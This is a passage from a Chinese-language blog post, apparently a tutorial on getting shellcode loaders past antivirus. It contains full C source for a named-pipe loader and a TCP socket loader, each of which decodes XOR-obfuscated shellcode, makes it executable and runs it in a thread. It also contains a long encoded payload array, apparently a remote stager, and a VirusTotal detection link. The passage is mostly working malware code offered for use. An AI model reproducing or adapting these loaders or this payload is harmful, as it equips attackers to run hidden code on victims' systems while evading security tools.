    DWORD dwLen<span class="token punctuation">;</span>
    PCHAR pszShellcode <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    DWORD dwOldProtect<span class="token punctuation">;</span> <span class="token comment">// 内存页属性</span>
    HANDLE hThread<span class="token punctuation">;</span>
    DWORD dwThreadId<span class="token punctuation">;</span>
    <span class="token comment">// 参考：https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-createnamedpipea</span>
    hPipe <span class="token operator">=</span> <span class="token function">CreateNamedPipe</span><span class="token punctuation">(</span>
        ptsPipeName<span class="token punctuation">,</span>
        PIPE_ACCESS_INBOUND<span class="token punctuation">,</span>
        PIPE_TYPE_BYTE<span class="token operator">|</span> PIPE_WAIT<span class="token punctuation">,</span>
        PIPE_UNLIMITED_INSTANCES<span class="token punctuation">,</span>
        BUFF_SIZE<span class="token punctuation">,</span>
        BUFF_SIZE<span class="token punctuation">,</span>
        <span class="token number">0</span><span class="token punctuation">,</span>
        <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>hPipe <span class="token operator">==</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span><span class="token punctuation">{</span>
        dwError <span class="token operator">=</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[-]Create Pipe Error : %d \n"</span><span class="token punctuation">,</span>dwError<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> dwError<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">ConnectNamedPipe</span><span class="token punctuation">(</span>hPipe<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+]Client Connected...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">ReadFile</span><span class="token punctuation">(</span>hPipe<span class="token punctuation">,</span>szBuffer<span class="token punctuation">,</span>BUFF_SIZE<span class="token punctuation">,</span><span class="token operator">&amp;</span>dwLen<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+]Get DATA Length : %d \n"</span><span class="token punctuation">,</span>dwLen<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 申请内存页</span>
        pszShellcode <span class="token operator">=</span> <span class="token punctuation">(</span>PCHAR<span class="token punctuation">)</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span>dwLen<span class="token punctuation">,</span>MEM_COMMIT<span class="token punctuation">,</span>PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 拷贝内存</span>
        <span class="token function">CopyMemory</span><span class="token punctuation">(</span>pszShellcode<span class="token punctuation">,</span>szBuffer<span class="token punctuation">,</span>dwLen<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">for</span><span class="token punctuation">(</span>DWORD i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span> dwLen<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">_InterlockedXor8</span><span class="token punctuation">(</span>pszShellcode<span class="token operator">+</span>i<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// 这里开始更改它的属性为可执行</span>
        <span class="token function">VirtualProtect</span><span class="token punctuation">(</span>pszShellcode<span class="token punctuation">,</span>dwLen<span class="token punctuation">,</span>PAGE_EXECUTE<span class="token punctuation">,</span><span class="token operator">&amp;</span>dwOldProtect<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 执行Shellcode</span>
        hThread <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span>
            <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// 安全描述符</span>
            <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// 栈的大小</span>
            <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>pszShellcode<span class="token punctuation">,</span> <span class="token comment">// 函数</span>
            <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// 参数</span>
            <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// 线程标志</span>
            <span class="token operator">&amp;</span>dwThreadId <span class="token comment">// 线程ID</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>hThread<span class="token punctuation">,</span>INFINITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p><strong>BadCodePipeClient</strong></p>
<pre><code class="prism language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;intrin.h&gt;</span></span>

<span class="token macro property">#<span class="token directive keyword">define</span> BUFF_SIZE 1024</span>
<span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a"</span><span class="token punctuation">;</span>
PTCHAR ptsPipeName <span class="token operator">=</span> <span class="token function">TEXT</span><span class="token punctuation">(</span><span class="token string">"\\\\.\\pipe\\BadCodeTest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


BOOL <span class="token function">RecvShellcode</span><span class="token punctuation">(</span>VOID<span class="token punctuation">)</span><span class="token punctuation">{</span>
    HANDLE hPipeClient<span class="token punctuation">;</span>
    DWORD dwWritten<span class="token punctuation">;</span>
    DWORD dwShellcodeSize <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 等待管道可用</span>
    <span class="token function">WaitNamedPipe</span><span class="token punctuation">(</span>ptsPipeName<span class="token punctuation">,</span>NMPWAIT_WAIT_FOREVER<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 连接管道</span>
    hPipeClient <span class="token operator">=</span> <span class="token function">CreateFile</span><span class="token punctuation">(</span>ptsPipeName<span class="token punctuation">,</span>GENERIC_WRITE<span class="token punctuation">,</span>FILE_SHARE_READ<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span>OPEN_EXISTING <span class="token punctuation">,</span>FILE_ATTRIBUTE_NORMAL<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>hPipeClient <span class="token operator">==</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+]Can't Open Pipe , Error : %d \n"</span><span class="token punctuation">,</span><span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">WriteFile</span><span class="token punctuation">(</span>hPipeClient<span class="token punctuation">,</span>buf<span class="token punctuation">,</span>dwShellcodeSize<span class="token punctuation">,</span><span class="token operator">&amp;</span>dwWritten<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>dwWritten <span class="token operator">==</span> dwShellcodeSize<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hPipeClient<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+]Send Success ! Shellcode : %d Bytes\n"</span><span class="token punctuation">,</span>dwShellcodeSize<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hPipeClient<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">wmain</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> TCHAR <span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

    <span class="token function">RecvShellcode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p><strong>0x02 网络套接字（SOCKET）</strong><br>
<img src="https://img-blog.csdnimg.cn/20201008165810953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
通过建立一个客户端和服务端，进行Shellcode的收发，类似于Java中的反序列化。</p>
<p><strong>服务端</strong></p>
<pre><code class="prism language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;WinSock2.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;intrin.h&gt;</span></span>

<span class="token macro property">#<span class="token directive keyword">pragma</span> comment(lib,"ws2_32.lib")</span>

BOOL <span class="token function">RunCode</span><span class="token punctuation">(</span>CHAR <span class="token operator">*</span> code<span class="token punctuation">,</span>DWORD dwCodeLen<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    HANDLE hThread<span class="token punctuation">;</span>
    DWORD dwOldProtect<span class="token punctuation">;</span>
    DWORD dwThreadId<span class="token punctuation">;</span>
    PCHAR pszShellcode <span class="token operator">=</span> <span class="token punctuation">(</span>PCHAR<span class="token punctuation">)</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span>dwCodeLen<span class="token punctuation">,</span>MEM_COMMIT<span class="token punctuation">,</span>PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">CopyMemory</span><span class="token punctuation">(</span>pszShellcode<span class="token punctuation">,</span>code<span class="token punctuation">,</span>dwCodeLen<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span><span class="token punctuation">(</span>DWORD i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span> dwCodeLen<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">_InterlockedXor8</span><span class="token punctuation">(</span>pszShellcode<span class="token operator">+</span>i<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">// 这里开始更改它的属性为可执行</span>
        <span class="token function">VirtualProtect</span><span class="token punctuation">(</span>pszShellcode<span class="token punctuation">,</span>dwCodeLen<span class="token punctuation">,</span>PAGE_EXECUTE<span class="token punctuation">,</span><span class="token operator">&amp;</span>dwOldProtect<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 执行Shellcode</span>
        hThread <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span>
            <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// 安全描述符</span>
            <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// 栈的大小</span>
            <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>pszShellcode<span class="token punctuation">,</span> <span class="token comment">// 函数</span>
            <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// 参数</span>
            <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// 线程标志</span>
            <span class="token operator">&amp;</span>dwThreadId <span class="token comment">// 线程ID</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>hThread<span class="token punctuation">,</span>INFINITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">wmain</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> TCHAR argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    CHAR buf<span class="token punctuation">[</span><span class="token number">801</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    DWORD dwError<span class="token punctuation">;</span>
    WORD sockVersion <span class="token operator">=</span> <span class="token function">MAKEWORD</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    WSADATA wsaData<span class="token punctuation">;</span>
    SOCKET socks<span class="token punctuation">;</span>
    SOCKET sClient<span class="token punctuation">;</span>
    <span class="token keyword">struct</span> sockaddr_in s_client<span class="token punctuation">;</span>
    INT nAddrLen <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>s_client<span class="token punctuation">)</span><span class="token punctuation">;</span>
    SHORT sListenPort <span class="token operator">=</span> <span class="token number">8888</span><span class="token punctuation">;</span>
    <span class="token keyword">struct</span> sockaddr_in sin<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WSAStartup</span><span class="token punctuation">(</span>sockVersion<span class="token punctuation">,</span> <span class="token operator">&amp;</span>wsaData<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        dwError <span class="token operator">=</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*]WSAStarup Error : %d \n"</span><span class="token punctuation">,</span>dwError<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> dwError<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    socks <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> IPPROTO_TCP<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>socks <span class="token operator">==</span> INVALID_SOCKET<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        dwError <span class="token operator">=</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*]Socket Error : %d \n"</span><span class="token punctuation">,</span>dwError<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> dwError<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    sin<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>
    sin<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span>sListenPort<span class="token punctuation">)</span><span class="token punctuation">;</span>
    sin<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>S_un<span class="token punctuation">.</span>S_addr <span class="token operator">=</span> INADDR_ANY<span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">bind</span><span class="token punctuation">(</span>socks<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">struct</span> sockaddr <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>sin<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>sin<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> SOCKET_ERROR <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        dwError <span class="token operator">=</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*]Bind Error : %d \n"</span><span class="token punctuation">,</span>dwError<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> dwError<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">listen</span><span class="token punctuation">(</span>socks<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">==</span> SOCKET_ERROR<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        dwError <span class="token operator">=</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*]Listen  Error : %d \n"</span><span class="token punctuation">,</span>dwError<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> dwError<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    sClient <span class="token operator">=</span> <span class="token function">accept</span><span class="token punctuation">(</span>socks<span class="token punctuation">,</span> <span class="token punctuation">(</span>SOCKADDR <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>s_client<span class="token punctuation">,</span> <span class="token operator">&amp;</span>nAddrLen<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token function">recv</span><span class="token punctuation">(</span>sClient<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>ret <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+]Recv %d-Bytes \n"</span><span class="token punctuation">,</span>ret<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">closesocket</span><span class="token punctuation">(</span>sClient<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">closesocket</span><span class="token punctuation">(</span>socks<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">WSACleanup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">RunCode</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008165831198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>virustotal<span class="token punctuation">.</span>com<span class="token operator">/</span>gui<span class="token operator">/</span>file<span class="token operator">/</span><span class="token number">3</span>dbef953e7bb0839d7abe9db7003bdad6ac7d7b0581ea7fd2b5131e79034e4b2<span class="token operator">/</span>detection
</code></pre>
<p><strong>客户端</strong></p>
<pre><code class="prism language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;WinSock2.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;intrin.h&gt;</span></span>

<span class="token macro property">#<span class="token directive keyword">pragma</span> comment(lib,"ws2_32.lib")</span>
<span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49